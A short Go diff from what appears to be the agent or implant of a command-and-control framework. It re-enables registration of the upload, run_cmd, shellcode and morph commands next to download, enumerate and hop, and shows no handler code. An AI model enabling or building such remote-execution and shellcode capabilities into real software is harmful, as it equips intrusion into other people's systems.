@@ -52,12 +52,12 @@ func NewAgent(cfg config.AgentConfig) (*Agent, error) {
 }
 
 func registerCommands(agent *Agent) {
-	//agent.commandOrchestrators["upload"] = (*Agent).orchestrateUpload
+	agent.commandOrchestrators["upload"] = (*Agent).orchestrateUpload
 	agent.commandOrchestrators["download"] = (*Agent).orchestrateDownload
-	//agent.commandOrchestrators["run_cmd"] = (*Agent).orchestrateRunCmd
-	//agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
+	agent.commandOrchestrators["run_cmd"] = (*Agent).orchestrateRunCmd
+	agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
 	agent.commandOrchestrators["enumerate"] = (*Agent).orchestrateEnumerate
-	//agent.commandOrchestrators["morph"] = (*Agent).orchestrateMorph
+	agent.commandOrchestrators["morph"] = (*Agent).orchestrateMorph
 	agent.commandOrchestrators["hop"] = (*Agent).orchestrateHop
 
 }
